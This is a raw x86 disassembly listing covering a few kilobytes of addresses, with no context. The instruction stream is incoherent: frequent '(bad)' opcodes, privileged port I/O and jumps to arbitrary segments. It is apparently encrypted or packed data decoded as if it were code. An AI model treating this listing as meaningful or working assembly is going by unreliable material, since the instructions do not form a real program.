  411db9:	xlat   BYTE PTR ds:[ebx]
  411dba:	xor    BYTE PTR [eax-0x2c],ch
  411dbd:	add    al,0xf6
  411dbf:	ss mov dl,0xb5
  411dc2:	jecxz  0x411e13
  411dc4:	idiv   DWORD PTR [ebp+0x2d5987e2]
  411dca:	int    0x5e
  411dcc:	inc    edx
  411dcd:	jp     0x411e40
  411dcf:	push   ecx
  411dd0:	mov    ah,0x63
  411dd2:	std    
  411dd3:	or     BYTE PTR [ebx],dh
  411dd5:	sub    DWORD PTR [edi+0x47],0xfffffff4
  411dd9:	jge    0x411e28
  411ddb:	popa   
  411ddc:	or     DWORD PTR [ebx-0x5be0624f],0x43ade8d3
  411de6:	pop    ss
  411de7:	xchg   esp,eax
  411de8:	arpl   WORD PTR [edx-0x5a],sp
  411deb:	je     0x411e49
  411ded:	sbb    esp,esp
  411def:	pusha  
  411df0:	fs aad 0x51
  411df3:	add    esi,esi
  411df5:	shr    DWORD PTR [edx+0x6b],0x98
  411df9:	fild   DWORD PTR [esp+ebx*4+0x37]
  411dfd:	pop    esp
  411dfe:	pop    edx
  411dff:	xchg   ebp,eax
  411e00:	(bad)  
  411e01:	sti    
  411e02:	push   cs
  411e03:	es int3 
  411e05:	mov    bl,0xf1
  411e07:	xchg   BYTE PTR [ebx-0x48],bh
  411e0a:	or     BYTE PTR [esi],0x91
  411e0d:	cs cmp bh,dl
  411e10:	div    cl
  411e12:	in     al,0xea
  411e14:	and    esp,DWORD PTR [edx+0x6d727521]
  411e1a:	div    BYTE PTR [eax-0x3cd88b1e]
  411e20:	push   esp
  411e21:	xor    eax,0x9d7719e9
  411e26:	dec    esi
  411e27:	mov    dl,0x1d
  411e29:	lahf   
  411e2a:	repz add al,0x91
  411e2d:	inc    DWORD PTR cs:[ebx]
  411e30:	fiadd  DWORD PTR [esi]
  411e32:	push   cs
  411e33:	lods   al,BYTE PTR ds:[esi]
  411e34:	sub    ebp,DWORD PTR ss:[ecx+ebp*1+0x37ea9611]
  411e3c:	sahf   
  411e3d:	pop    eax
  411e3e:	loop   0x411e37
  411e40:	adc    al,0x0
  411e42:	push   edi
  411e43:	and    eax,0xcafe0d73
  411e48:	dec    ebp
  411e49:	retf   
  411e4a:	pop    esi
  411e4b:	xchg   edi,eax
  411e4c:	iret   
  411e4d:	pop    ebx
  411e4e:	xor    eax,0xda579def
  411e53:	in     al,0x3
  411e55:	xchg   ebx,eax
  411e56:	call   0xa333b579
  411e5b:	cs or  al,0xfe
  411e5e:	fwait
  411e5f:	xchg   ecx,eax
  411e60:	jae    0x411e5f
  411e62:	test   al,0x45
  411e64:	in     eax,dx
  411e65:	mov    esi,0x738d2cb0
  411e6a:	push   ebp
  411e6b:	mov    dl,0x22
  411e6d:	xchg   ebx,eax
  411e6e:	imul   ebx,ebx,0xffffffdb
  411e71:	jl     0x411eab
  411e73:	aas    
  411e74:	push   eax
  411e75:	aaa    
  411e76:	mov    ds:0x41ac9128,al
  411e7b:	fst    QWORD PTR [eax+0x68]
  411e7e:	inc    eax
  411e7f:	xor    BYTE PTR [esi],ah
  411e81:	test   al,0xe0
  411e83:	mov    cs:0xa0d8129b,al
  411e89:	(bad)  
  411e8a:	and    ebx,edi
  411e8c:	jecxz  0x411eae
  411e8e:	push   ds
  411e8f:	mov    edx,0x8b9d3fa7
  411e94:	fnstsw WORD PTR [edi]
  411e96:	cmp    bh,bl
  411e98:	jne    0x411ec5
  411e9a:	std    
  411e9b:	xchg   esp,eax
  411e9c:	mov    BYTE PTR [ebx-0x241b6af2],bl
  411ea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ea3:	or     edi,ebx
  411ea5:	cmp    al,0x91
  411ea7:	daa    
  411ea8:	fist   WORD PTR [ecx+0x64f1d97b]
  411eae:	(bad)  
  411eaf:	mov    ecx,0x8f6e4581
  411eb4:	call   FWORD PTR [esi-0x6d]
  411eb7:	pop    ebp
  411eb8:	psrlq  mm0,QWORD PTR [ebx+0xdc6d75f]
  411ebf:	jbe    0x411e92
  411ec1:	xchg   ebx,eax
  411ec2:	mov    ch,0xfe
  411ec4:	in     eax,0xe4
  411ec6:	in     al,dx
  411ec7:	mov    esp,DWORD PTR [eax+0x39]
  411eca:	jnp    0x411ec3
  411ecc:	retf   
  411ecd:	jne    0x411f4a
  411ecf:	out    dx,al
  411ed0:	rcl    BYTE PTR [ebp+0x19],0x3b
  411ed4:	fisttp DWORD PTR [ebx]
  411ed6:	out    0x10,eax
  411ed8:	lock in eax,dx
  411eda:	cmp    eax,0x2912dd6f
  411edf:	inc    ebx
  411ee0:	(bad)  
  411ee1:	idiv   BYTE PTR [ebx]
  411ee3:	push   ss
  411ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ee5:	int3   
  411ee6:	(bad)  
  411ee7:	pop    esi
  411ee8:	cmp    esp,edx
  411eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eeb:	adc    BYTE PTR [edx+ecx*4],al
  411eee:	call   0x23a05a56
  411ef3:	sbb    BYTE PTR [ebp+0xa],bl
  411ef6:	rcl    BYTE PTR [esi-0x73],1
  411ef9:	cmp    al,0x3c
  411efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411efc:	mov    bl,BYTE PTR [ecx+0x63]
  411eff:	sbb    ah,ah
  411f01:	or     DWORD PTR [ecx-0x4ee74b3a],edi
  411f07:	jg     0x411ee7
  411f09:	mov    bl,0x5a
  411f0b:	popa   
  411f0c:	xor    eax,0xe89bc1ca
  411f11:	cdq    
  411f12:	into   
  411f13:	and    BYTE PTR ds:0xa28146ed,dh
  411f19:	stos   BYTE PTR es:[edi],al
  411f1a:	mov    edi,0xb6d64a34
  411f1f:	nop
  411f20:	pop    esi
  411f21:	in     al,dx
  411f22:	sbb    al,0x7
  411f24:	xchg   ebp,eax
  411f25:	dec    ebp
  411f26:	xor    edx,DWORD PTR [ecx+esi*1]
  411f29:	repnz test BYTE PTR [edi-0x16],bl
  411f2d:	xor    al,0x93
  411f2f:	loopne 0x411edf
  411f31:	outs   dx,DWORD PTR ds:[esi]
  411f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f33:	xor    al,0xfd
  411f35:	xor    al,0x65
  411f37:	ss push esp
  411f39:	cmp    al,BYTE PTR [ebx-0x7ce770fc]
  411f3f:	mov    ds:0x18390b3b,al
  411f44:	mov    esp,0x1d50bcd7
  411f49:	fucomi st,st(6)
  411f4b:	lods   al,BYTE PTR ds:[esi]
  411f4c:	loopne 0x411f4d
  411f4e:	push   cs
  411f4f:	cwde   
  411f50:	xlat   BYTE PTR ds:[ebx]
  411f51:	imul   esp,esp,0xc
  411f54:	pop    ebx
  411f55:	es xchg edx,eax
  411f57:	mov    ds:0x19bc0b4,al
  411f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f5d:	jg     0x411f06
  411f5f:	ins    BYTE PTR es:[edi],dx
  411f60:	test   BYTE PTR [eax+ecx*1+0x4c4c8c04],ch
  411f67:	sub    eax,0x539cfa75
  411f6c:	(bad)  
  411f6d:	(bad)  
  411f6f:	dec    ebx
  411f70:	cs or  esi,edx
  411f73:	ins    BYTE PTR es:[edi],dx
  411f74:	mov    esi,0xc9630528
  411f79:	mov    eax,ds:0x6762f408
  411f7e:	stos   DWORD PTR es:[edi],eax
  411f7f:	or     esi,DWORD PTR [esi-0x21]
  411f82:	sbb    DWORD PTR [eax-0x9c02c07],eax
  411f88:	retf   0x3f4a
  411f8b:	add    al,0x39
  411f8d:	adc    eax,0xdbde58a5
  411f92:	popaw  
  411f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f95:	or     DWORD PTR [edx+0x36],ebp
  411f98:	cmp    DWORD PTR [edi+0x17],eax
  411f9b:	and    al,0xf6
  411f9d:	inc    ebp
  411f9e:	dec    eax
  411f9f:	fdivr  QWORD PTR [ebx-0x24]
  411fa2:	xor    bh,BYTE PTR [eax]
  411fa4:	leave  
  411fa5:	les    edi,FWORD PTR [edi+0x5f]
  411fa8:	in     eax,dx
  411fa9:	jl     0x41201e
  411fab:	mov    ds:0x39a56a02,eax
  411fb0:	add    DWORD PTR [edi-0xc],edi
  411fb3:	(bad)  
  411fb4:	retf   0x34e0
  411fb7:	je     0x411f72
  411fb9:	pop    ecx
  411fba:	cmc    
  411fbb:	dec    edx
  411fbc:	jmp    0x1e10:0x9279113d
  411fc3:	inc    esp
  411fc4:	push   ebp
  411fc5:	jne    0x411fa4
  411fc7:	js     0x412043
  411fc9:	(bad)  
  411fca:	sbb    BYTE PTR [edi],bh
  411fcc:	loope  0x411f4e
  411fce:	stos   DWORD PTR es:[edi],eax
  411fcf:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fd1:	pop    edi
  411fd2:	mov    dl,0x2a
  411fd4:	imul   esp,edx,0x44
  411fd7:	xchg   edi,eax
  411fd8:	out    0x72,al
  411fda:	shl    DWORD PTR [edx],0x39
  411fdd:	adc    eax,0x9ae4a25b
  411fe2:	xchg   esp,eax
  411fe3:	pusha  
  411fe4:	mov    ds:0x9d11d14,eax
  411fe9:	leave  
  411fea:	push   ecx
  411feb:	jbe    0x411f79
  411fed:	and    eax,0x64f65b63
  411ff2:	add    dh,BYTE PTR [ebx-0x1f]
  411ff5:	sbb    cl,BYTE PTR [ecx]
  411ff7:	push   ebx
  411ff8:	shl    DWORD PTR [esi],0x2a
  411ffb:	jge    0x411f9f
  411ffd:	push   0x418f6fef
  412002:	or     al,0xc3
  412004:	mov    dh,0xee
  412006:	sub    bl,BYTE PTR [eax-0x7251581e]
  41200c:	jle    0x411fc8
  41200e:	push   0x334ceea8
  412013:	jne    0x412072
  412015:	sar    DWORD PTR [edx],1
  412017:	ss cmp al,0xd
  41201a:	inc    ebp
  41201b:	leave  
  41201c:	cmp    esi,DWORD PTR [ebp-0x58b6c10e]
  412022:	jmp    0x411ff1
  412024:	sbb    BYTE PTR [esi-0x3197ba7d],ah
  41202a:	xlat   BYTE PTR ds:[ebx]
  41202b:	aas    
  41202c:	daa    
  41202d:	cli    
  41202e:	mov    ds:0x23daacc7,eax
  412033:	add    esp,DWORD PTR [ebx+0x6e]
  412036:	or     eax,0x5ca1294e
  41203b:	jge    0x411ff2
  41203d:	fwait
  41203e:	pusha  
  41203f:	fild   DWORD PTR [eax+0x7e]
  412042:	jg     0x4120a5
  412044:	arpl   ax,sp
  412046:	sbb    esp,ecx
  412048:	inc    ecx
  412049:	loopne 0x4120a1
  41204b:	cs or  ebp,DWORD PTR ds:[edx-0x5b118096]
  412053:	ja     0x412086
  412055:	push   ds
  412056:	lahf   
  412057:	jns    0x411fe7
  412059:	inc    esp
  41205a:	jno    0x412052
  41205c:	dec    esi
  41205d:	inc    edi
  41205e:	mov    dl,0x13
  412060:	dec    ebx
  412061:	pop    ebx
  412062:	push   eax
  412063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412064:	push   0x3304a2c6
  412069:	enter  0xc2ce,0xaa
  41206d:	mov    ebx,0x7f03a59b
  412072:	push   0x407d50f4
  412077:	sub    eax,0x89a898f2
  41207c:	push   edi
  41207d:	inc    esp
  41207e:	push   ecx
  41207f:	xor    ch,ch
  412081:	mov    ecx,0x12f07847
  412086:	adc    eax,0x15d88f28
  41208b:	push   ebp
  41208c:	inc    eax
  41208d:	or     BYTE PTR [edx+ebx*4+0x1f],ah
  412091:	push   edi
  412092:	mov    al,ds:0xea66fedb
  412097:	xchg   esp,eax
  412098:	stos   BYTE PTR es:[edi],al
  412099:	mov    dh,0x31
  41209b:	test   al,0x84
  41209d:	ja     0x4120f1
  41209f:	jne    0x4120a0
  4120a1:	out    dx,eax
  4120a2:	rol    DWORD PTR [ecx-0x32],1
  4120a5:	ins    DWORD PTR es:[edi],dx
  4120a6:	xchg   ch,ch
  4120a8:	and    BYTE PTR [edi],ch
  4120aa:	dec    eax
  4120ab:	repz popa 
  4120ad:	mov    ecx,0xa74a562c
  4120b2:	mov    eax,0x3b84c402
  4120b7:	xor    eax,DWORD PTR [eax-0x61]
  4120ba:	add    DWORD PTR [ebx+0x6fbf664b],esi
  4120c0:	retf   
  4120c1:	and    al,0xd1
  4120c3:	xor    ah,dl
  4120c5:	enter  0x594d,0x79
  4120c9:	pop    esp
  4120ca:	(bad)
  4120ce:	ja     0x4120b0
  4120d0:	cmp    al,0xa2
  4120d2:	js     0x4120f5
  4120d4:	dec    eax
  4120d5:	ret    
  4120d6:	xor    ebx,DWORD PTR [esi+0x2bb34d92]
  4120dc:	call   0x1354dd0d
  4120e1:	mov    gs,WORD PTR [ecx-0x17]
  4120e4:	sub    dl,BYTE PTR [ecx+0x23]
  4120e7:	sbb    DWORD PTR [ebx-0x5d7e09b2],ebp
  4120ed:	(bad)  
  4120ee:	clc    
  4120ef:	pop    DWORD PTR [eax+eiz*4+0xead1656]
  4120f6:	ins    BYTE PTR es:[edi],dx
  4120f7:	cmp    DWORD PTR [ebp+0x9],eax
  4120fa:	xchg   edx,eax
  4120fb:	bound  esi,QWORD PTR [eax]
  4120fd:	(bad)  
  4120fe:	xlat   BYTE PTR ds:[ebx]
  4120ff:	or     al,0x57
  412101:	scas   eax,DWORD PTR es:[edi]
  412102:	ret    
  412103:	mov    ah,0xf
  412105:	fsub   DWORD PTR [ecx-0x5c5c8a59]
  41210b:	repz mov dh,0x59
  41210e:	push   edi
  41210f:	int    0x58
  412111:	push   ecx
  412112:	out    dx,eax
  412113:	hlt    
  412114:	daa    
  412115:	cmc    
  412116:	push   ecx
  412117:	ret    
  412118:	dec    edi
  412119:	or     DWORD PTR [ebp+0x4366e92f],esi
  41211f:	lea    edi,[ecx-0x719901ff]
  412125:	mov    ds:0xf668a4d8,al
  41212a:	cli    
  41212b:	add    BYTE PTR [edi-0x3e48ba5f],ah
  412131:	fsubr  QWORD PTR [ecx]
  412133:	sbb    cl,dl
  412135:	je     0x412121
  412137:	mov    bl,BYTE PTR [edx]
  412139:	(bad)  
  41213a:	xchg   ebp,eax
  41213b:	jecxz  0x41216b
  41213d:	sbb    dl,ch
  41213f:	sbb    ah,BYTE PTR [ebx+0x3a]
  412142:	sahf   
  412143:	arpl   WORD PTR [ebp-0x52],di
  412146:	push   ebp
  412147:	rcr    DWORD PTR [edi-0x79],1
  41214a:	in     al,dx
  41214b:	jle    0x41211a
  41214d:	push   es
  41214e:	mov    dh,0x1c
  412150:	sub    al,0x8f
  412152:	add    DWORD PTR [edi],edi
  412154:	mov    bl,0xd0
  412156:	mov    esp,0x66526d7a
  41215b:	aam    0x35
  41215d:	add    BYTE PTR [eax+0x37a93d10],cl
  412163:	aad    0xb9
  412165:	mov    DWORD PTR [ebx+0x50394bf4],ebx
  41216b:	xchg   DWORD PTR [ebp-0x45],ebx
  41216e:	pop    ecx
  41216f:	adc    bh,BYTE PTR ds:0x319e2597
  412175:	adc    DWORD PTR [eax+eax*2-0x21],0x657169bf
  41217d:	scas   eax,DWORD PTR es:[edi]
  41217e:	fistp  WORD PTR [ecx+0x5d151833]
  412184:	mov    ebp,0xcba05da5
  41218a:	xor    DWORD PTR [eax+0x4724fa7],esp
  412190:	pop    ebp
  412191:	fcomp  DWORD PTR [ecx-0x63]
  412194:	out    0x66,eax
  412196:	test   DWORD PTR [edx+eax*1-0x67eebcde],edx
  41219d:	inc    ecx
  41219e:	push   0x3a
  4121a0:	inc    edi
  4121a1:	dec    ebx
  4121a2:	push   ss
  4121a3:	dec    eax
  4121a4:	and    al,0xf8
  4121a6:	mov    eax,0xd007e704
  4121ab:	pusha  
  4121ac:	out    dx,eax
  4121ad:	aas    
  4121ae:	xor    BYTE PTR [ebx],al
  4121b0:	imul   edi,DWORD PTR [edi-0x5aee78c3],0x29
  4121b7:	loope  0x4121d2
  4121b9:	jecxz  0x41213b
  4121bb:	xchg   DWORD PTR [eax+0x658be27c],eax
  4121c1:	jge    0x4121b1
  4121c3:	fs jl  0x4121e5
  4121c6:	jecxz  0x41214f
  4121c8:	addr16 xchg edx,eax
  4121ca:	(bad)  
  4121cb:	outs   dx,DWORD PTR ds:[esi]
  4121cc:	retf   0xe6f9
  4121cf:	xor    al,0xc4
  4121d1:	push   ebx
  4121d2:	bound  esi,QWORD PTR [edx+0x23]
  4121d5:	sahf   
  4121d6:	rcl    dl,1
  4121d8:	mov    edi,0xc1cb8109
  4121dd:	jge    0x4121e0
  4121df:	std    
  4121e0:	mov    bl,0x3c
  4121e2:	hlt    
  4121e3:	push   es
  4121e4:	scas   al,BYTE PTR es:[edi]
  4121e5:	cli    
  4121e6:	shl    BYTE PTR [ebp-0x5a],0x80
  4121ea:	out    0xec,al
  4121ec:	loopne 0x4121ae
  4121ee:	xchg   edx,eax
  4121ef:	push   es
  4121f0:	sbb    bl,BYTE PTR [edx+ecx*8-0xf]
  4121f4:	adc    DWORD PTR [ebx],ebp
  4121f6:	ficom  DWORD PTR [ecx]
  4121f8:	fidivr WORD PTR [ebx+0x364fa452]
  4121fe:	xor    ah,0x5e
  412201:	mov    DWORD PTR [esi-0x75],eax
  412204:	test   bl,0x7f
  412207:	je     0x412274
  412209:	mov    edi,edx
  41220b:	push   edi
  41220c:	jbe    0x4121a9
  41220e:	ja     0x41228f
  412210:	adc    edi,DWORD PTR [eax]
  412212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412213:	mov    esi,0x619f1100
  412218:	jb     0x4121e2
  41221a:	addr16 push esp
  41221c:	adc    eax,0x3aa4abe3
  412221:	aaa    
  412222:	or     DWORD PTR [ebp+0x10],edx
  412225:	retf   0x64a2
  412228:	mov    ebx,DWORD PTR [ecx+0xffda0c5]
  41222e:	lea    esi,[ebx]
  412230:	test   BYTE PTR [edx-0x24],ch
  412233:	jge    0x412267
  412235:	adc    bh,BYTE PTR [edi-0x1a]
  412238:	sbb    ecx,DWORD PTR [edx-0x14b91c2d]
  41223e:	lods   eax,DWORD PTR ds:[esi]
  41223f:	(bad)  
  412240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412241:	pop    edi
  412242:	xor    ah,cl
  412244:	cwde   
  412245:	outs   dx,BYTE PTR ds:[esi]
  412246:	push   cs
  412247:	xchg   ecx,eax
  412248:	stos   DWORD PTR es:[edi],eax
  412249:	pop    ss
  41224a:	mov    eax,0x15d2bbb9
  41224f:	dec    eax
  412250:	cmp    al,0xe6
  412252:	in     eax,dx
  412253:	push   ds
  412254:	test   DWORD PTR [edx],0x4c8dc811
  41225a:	xchg   edi,eax
  41225b:	mov    ebx,0xedb36d8b
  412260:	push   ecx
  412261:	mov    ah,0x1e
  412263:	and    dh,BYTE PTR [edx]
  412265:	outs   dx,DWORD PTR ds:[esi]
  412266:	out    dx,eax
  412267:	jp     0x41226b
  412269:	mov    BYTE PTR [ebx+0x1d],ch
  41226c:	sub    DWORD PTR [edi],esp
  41226e:	push   edx
  41226f:	mov    esi,0xec416405
  412274:	adc    dh,BYTE PTR [eax]
  412276:	sub    BYTE PTR [ecx+0x3e],ah
  412279:	xchg   ebx,eax
  41227a:	xor    DWORD PTR [edx],ebp
  41227c:	dec    ecx
  41227d:	xchg   ebp,eax
  41227e:	inc    eax
  41227f:	add    bl,ah
  412281:	repnz fxch st(1)
  412284:	push   edi
  412285:	mov    esi,0x6f5489ce
  41228a:	retf   
  41228b:	sbb    ah,dh
  41228d:	in     eax,dx
  41228e:	mov    BYTE PTR [ebx-0x12],al
  412291:	xor    DWORD PTR [ebp-0xc],edx
  412294:	cld    
  412295:	lods   al,BYTE PTR ds:[esi]
  412296:	mov    ah,0x77
  412298:	mov    bl,0xb
  41229a:	add    al,0xf8
  41229c:	pop    edi
  41229d:	xchg   edi,eax
  41229e:	cdq    
  41229f:	shl    DWORD PTR [edx+0x42ee126c],0x62
  4122a6:	int    0x4e
  4122a8:	inc    ebx
  4122a9:	dec    esi
  4122aa:	mov    ds:0x56f20eaa,al
  4122af:	mov    al,0x8a
  4122b1:	mov    eax,ds:0x8ee72e66
  4122b6:	cdq    
  4122b7:	xchg   edi,eax
  4122b8:	pop    edi
  4122b9:	add    eax,0xd00eb591
  4122be:	xlat   BYTE PTR ds:[ebx]
  4122bf:	rcr    DWORD PTR [ecx+0x50b579ef],1
  4122c5:	(bad)  
  4122c6:	adc    esi,ebp
  4122c8:	jp     0x41228d
  4122ca:	cld    
  4122cb:	sub    eax,0x6c3fdb73
  4122d0:	mov    bl,0x17
  4122d2:	dec    edi
  4122d3:	int3   
  4122d4:	call   0xeeac:0xa9e5a98b
  4122db:	repnz xlat BYTE PTR ds:[ebx]
  4122dd:	mov    ebx,0x7c40c10f
  4122e2:	outs   dx,DWORD PTR ds:[esi]
  4122e3:	push   ecx
  4122e4:	add    al,0x27
  4122e6:	ret    0xcdb6
  4122e9:	ror    cl,0x67
  4122ec:	out    0xf0,eax
  4122ee:	aas    
  4122ef:	(bad)  
  4122f0:	aad    0x1a
  4122f2:	dec    eax
  4122f3:	rcr    DWORD PTR [ebp+0x605f9a87],1
  4122f9:	xchg   edx,eax
  4122fa:	dec    eax
  4122fb:	cmp    BYTE PTR [ebx+0x2a],cl
  4122fe:	xor    DWORD PTR [edx],ebp
  412300:	sbb    al,0x20
  412302:	jle    0x41230d
  412304:	stos   DWORD PTR es:[edi],eax
  412305:	pusha  
  412306:	test   ecx,ebp
  412308:	inc    ebx
  412309:	dec    esi
  41230a:	xchg   esp,eax
  41230b:	add    al,0x3c
  41230d:	das    
  41230e:	mov    WORD PTR [ebp-0x8ab6581],cs
  412314:	mov    al,0x72
  412316:	mov    ebx,0x5489123e
  41231b:	pop    edi
  41231c:	popf   
  41231d:	loopne 0x412331
  41231f:	jg     0x412362
  412321:	push   edx
  412322:	mov    al,0xd8
  412324:	xchg   ebx,eax
  412325:	popa   
  412326:	popf   
  412327:	fsub   DWORD PTR [ecx+0x19c3444d]
  41232d:	mov    al,ds:0x3296383d
  412332:	pop    edi
  412333:	arpl   cx,bp
  412335:	mov    BYTE PTR [ecx+0x78cf70a7],bh
  41233b:	jmp    0xdf3bc063
  412340:	adc    esi,DWORD PTR [edi-0x435ad97f]
  412346:	mov    bl,0x91
  412348:	lds    edi,FWORD PTR [ebx-0x77471ac5]
  41234e:	cmp    DWORD PTR [ebp-0x39d243c0],0x8a70b5b4
  412358:	or     DWORD PTR [ebp-0x7d],esp
  41235b:	sub    dh,bl
  41235d:	into   
  41235e:	jno    0x412380
  412360:	mov    cl,0xd5
  412362:	gs fwait
  412364:	adc    bh,BYTE PTR [ebx]
  412366:	lds    edx,FWORD PTR [edi+0x2085b6b6]
  41236c:	popf   
  41236d:	xor    eax,0xc40980b7
  412372:	int3   
  412373:	dec    ebp
  412374:	sbb    bh,BYTE PTR gs:[edx-0x51]
  412378:	fs ds push esp
  41237b:	fidiv  DWORD PTR [ebp+0x22575410]
  412381:	frstor [eax+0x56]
  412384:	sbb    al,0x72
  412386:	xor    bh,bh
  412388:	pushf  
  412389:	(bad)  
  41238a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41238b:	pop    ebp
  41238c:	fwait
  41238d:	sbb    al,0x54
  41238f:	cmp    eax,0xbd062de0
  412394:	hlt    
  412395:	add    BYTE PTR [ebx+edi*2],bh
  412398:	mov    al,ds:0xbbca80ec
  41239d:	dec    ecx
  41239e:	outs   dx,BYTE PTR ds:[esi]
  41239f:	lds    ecx,FWORD PTR [ebx+0x3e7210fc]
  4123a5:	dec    edx
  4123a6:	hlt    
  4123a7:	jg     0x412360
  4123a9:	rcl    DWORD PTR [eax+0x14],0x3a
  4123ad:	pop    ss
  4123ae:	(bad)  
  4123af:	cwde   
  4123b0:	jo     0x4123c1
  4123b2:	dec    esi
  4123b3:	adc    al,0xcc
  4123b5:	pusha  
  4123b6:	jle    0x4123c4
  4123b8:	xor    esp,DWORD PTR [edi-0x15]
  4123bb:	pop    edx
  4123bc:	and    bh,BYTE PTR [eax-0x63]
  4123bf:	mov    eax,0x3886106a
  4123c4:	or     al,0xba
  4123c6:	outs   dx,DWORD PTR ds:[esi]
  4123c7:	and    DWORD PTR [esi-0x20],esp
  4123ca:	xchg   ecx,eax
  4123cb:	and    BYTE PTR ds:0x151cdb5b,dh
  4123d1:	pop    ebx
  4123d2:	jle    0x4123e3
  4123d4:	mov    gs,WORD PTR [ebx]
  4123d6:	lock shl BYTE PTR [esi+0x63fd9060],0x52
  4123de:	jmp    0xff60da1
  4123e3:	push   0xffffff99
  4123e5:	push   esp
  4123e6:	sar    DWORD PTR [edx+0x4b0ccaed],0x50
  4123ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123ee:	adc    DWORD PTR [eax-0x453a2307],edx
  4123f4:	fldcw  WORD PTR [ebp-0x4e]
  4123f7:	mov    bh,0xb8
  4123f9:	dec    al
  4123fb:	(bad)  
  4123fc:	xchg   edi,eax
  4123fd:	aam    0xc8
  4123ff:	lock jae 0x4123d7
  412402:	ret    
  412403:	pop    eax
  412404:	mov    esp,0xb7661f02
  412409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41240a:	fdiv   DWORD PTR [eax-0x63]
  41240d:	xchg   ecx,eax
  41240e:	not    DWORD PTR [ecx-0x6a0da6a3]
  412414:	aad    0x3d
  412416:	in     al,0xd
  412418:	jno    0x4123ea
  41241a:	in     eax,dx
  41241b:	aad    0x4
  41241d:	daa    
  41241e:	sbb    al,0xd
  412420:	pop    ebx
  412421:	dec    esp
  412422:	fwait
  412423:	adc    eax,0x17d66b2
  412428:	pop    eax
  412429:	dec    ebx
  41242a:	push   eax
  41242b:	enter  0x6cd0,0x56
  41242f:	ror    DWORD PTR [esp+edi*8],0x6
  412433:	ds in  al,dx
  412435:	in     eax,dx
  412436:	sub    BYTE PTR [ecx+0x539cdc36],dh
  41243c:	sbb    ebx,eax
  41243e:	hlt    
  41243f:	test   BYTE PTR [edx-0x5a],dl
  412442:	adc    al,0x39
  412444:	xchg   ebx,eax
  412445:	inc    edi
  412446:	iret   
  412447:	lods   al,BYTE PTR ds:[esi]
  412448:	cmp    al,0x3d
  41244a:	xchg   esp,eax
  41244b:	inc    esp
  41244c:	inc    esp
  41244d:	add    al,0x7a
  41244f:	cld    
  412450:	xchg   ebx,eax
  412451:	out    dx,al
  412452:	aam    0xcb
  412454:	push   eax
  412455:	xchg   ebp,eax
  412456:	jg     0x41245a
  412458:	pop    ebx
  412459:	jle    0x412494
  41245b:	mov    bh,bl
  41245d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41245e:	daa    
  41245f:	jnp    0x4123f4
  412461:	in     eax,dx
  412462:	push   esi
  412463:	ds pop eax
  412465:	pop    eax
  412466:	es fwait
  412468:	pop    esi
  412469:	cmp    al,0x33
  41246b:	mov    al,BYTE PTR [ebx+edi*1]
  41246e:	addr16 scas al,BYTE PTR es:[di]
  412471:	ja     0x412420
  412473:	push   ss
  412474:	add    eax,0x5262220a
  412479:	xchg   esp,eax
  41247a:	test   al,0xf1
  41247c:	mov    dh,0x90
  41247e:	xchg   DWORD PTR [eax+0x2f13bba0],esp
  412484:	shl    BYTE PTR [edx+edx*4],cl
  412487:	aaa    
  412488:	bound  esp,QWORD PTR [ecx+0x23e26b25]
  41248e:	xchg   esp,eax
  41248f:	adc    BYTE PTR [eax+0x61ec3fb5],al
  412495:	mov    esp,0xfa2f14ac
  41249a:	shr    BYTE PTR [ebx],0x6b
  41249d:	jle    0x412478
  41249f:	push   0xffffffaf
  4124a1:	jne    0x412444
  4124a3:	jmp    0x41245d
  4124a5:	mov    ebx,0x8c733624
  4124aa:	mov    eax,ds:0x39ae19d
  4124af:	adc    ecx,DWORD PTR [edx+0x60]
  4124b2:	jbe    0x4124c6
  4124b4:	mov    BYTE PTR [esi],0x6b
  4124b7:	dec    eax
  4124b8:	test   BYTE PTR [edx],bl
  4124ba:	(bad)  
  4124bb:	fcomip st,st(1)
  4124bd:	push   ss
  4124be:	(bad)  
  4124bf:	out    dx,eax
  4124c0:	or     al,0xb
  4124c2:	(bad)  
  4124c3:	xchg   ebp,eax
  4124c4:	lods   eax,DWORD PTR ds:[esi]
  4124c5:	xchg   ebx,eax
  4124c6:	mov    edx,0x7961e05c
  4124cb:	xchg   eax,ebx
  4124cd:	mov    ds:0x5d040540,eax
  4124d2:	jl     0x412509
  4124d4:	sbb    al,0x35
  4124d6:	fimul  DWORD PTR [esi]
  4124d8:	loopne 0x41247a
  4124da:	inc    edi
  4124db:	mov    ah,dl
  4124dd:	jecxz  0x4124af
  4124df:	jo     0x4124ab
  4124e1:	inc    esi
  4124e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124e3:	out    dx,al
  4124e4:	pop    es
  4124e5:	add    bl,ch
  4124e7:	cmp    DWORD PTR [ebx+0x1e2c066d],edx
  4124ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ee:	je     0x41256b
  4124f0:	fld    TBYTE PTR [eax+edx*1]
  4124f3:	test   al,0xf9
  4124f5:	stos   BYTE PTR es:[edi],al
  4124f6:	xlat   BYTE PTR ds:[ebx]
  4124f7:	stc    
  4124f8:	ret    0x2c9
  4124fb:	lea    ecx,[edx]
  4124fd:	repz jmp 0x3b1778ab
  412503:	xchg   esp,eax
  412504:	push   eax
  412505:	jbe    0x41250e
  412507:	sbb    ah,BYTE PTR [edi-0x70263b55]
  41250d:	ins    DWORD PTR es:[edi],dx
  41250e:	cmp    DWORD PTR [esp+eax*4-0x63],ebp
  412512:	in     eax,0x88
  412514:	jno    0x41254c
  412516:	shl    al,1
  412518:	mov    ebx,0x4a47aabe
  41251d:	inc    esi
  41251e:	or     BYTE PTR ds:0x5e643ade,0xf5
